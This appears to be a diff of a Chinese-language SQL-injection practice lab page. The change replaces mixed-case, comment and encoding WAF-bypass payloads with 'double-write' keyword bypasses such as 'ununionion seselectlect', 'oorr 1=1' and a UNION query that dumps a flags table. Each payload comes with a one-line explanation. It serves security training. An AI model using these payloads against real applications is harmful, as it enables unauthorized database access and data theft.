@@ -321,26 +321,21 @@ $conn->close();
         <div class="card">
             <h3>🎯 绕过技巧Payload</h3>
             <div class="payload-list">
-                <h4>1. 大小写混合</h4>
-                <code onclick="setId('1 UnIoN SeLeCt 1,2,3,4,5')">1 UnIoN SeLeCt 1,2,3,4,5</code>
-                
-                <h4>2. 双写绕过</h4>
+                <h4>1. 双写绕过（推荐）</h4>
                 <code onclick="setId('1 ununionion seselectlect 1,2,3,4,5')">1 ununionion seselectlect 1,2,3,4,5</code>
+                <p style="color: #888; font-size: 12px;">原理：un<span style="color: #ff6b6b;">union</span>ion → union</p>
                 
-                <h4>3. 注释绕过</h4>
-                <code onclick="setId('1 /*!UNION*/ /*!SELECT*/ 1,2,3,4,5')">1 /*!UNION*/ /*!SELECT*/ 1,2,3,4,5</code>
-                <code onclick="setId('1 +UNION+SELECT+1,2,3,4,5')">1 +UNION+SELECT+1,2,3,4,5</code>
+                <h4>2. 查询所有用户（双写绕过）</h4>
+                <code onclick="setId('1 oorr 1=1')">1 oorr 1=1</code>
+                <p style="color: #888; font-size: 12px;">原理：o<span style="color: #ff6b6b;">or</span>r → or</p>
                 
-                <h4>4. 查询flag表</h4>
-                <code onclick="setId('0 UnIoN SeLeCt id,flag,description,flag,created_at FrOm flags')">0 UnIoN SeLeCt id,flag,description,flag,created_at FrOm flags</code>
+                <h4>3. 查询flag表（双写绕过）</h4>
+                <code onclick="setId('0 ununionion seselectlect id,flag,description,flag,created_at frfromom flags')">0 ununionion seselectlect id,flag,description,flag,created_at frfromom flags</code>
                 
-                <h4>5. 编码绕过</h4>
-                <code onclick="setId('1 AND 1=1')">1 AND 1=1</code>
-                <code onclick="setId('1 OR 1=1')">1 OR 1=1</code>
-                
-                <h4>6. 特殊字符</h4>
-                <code onclick="setId('1%20AND%201=1')">1%20AND%201=1</code>
-                <code onclick="setId('1/**/AND/**/1=1')">1/**/AND/**/1=1</code>
+                <h4>4. 其他双写技巧</h4>
+                <code onclick="setId('1 anandd 1=1')">1 anandd 1=1</code>
+                <code onclick="setId('1 whewherere 1=1')">1 whewherere 1=1</code>
+                <p style="color: #888; font-size: 12px;">WAF过滤列表中的关键词都可以用双写绕过</p>
             </div>
             
             <div class="bypass-techniques">
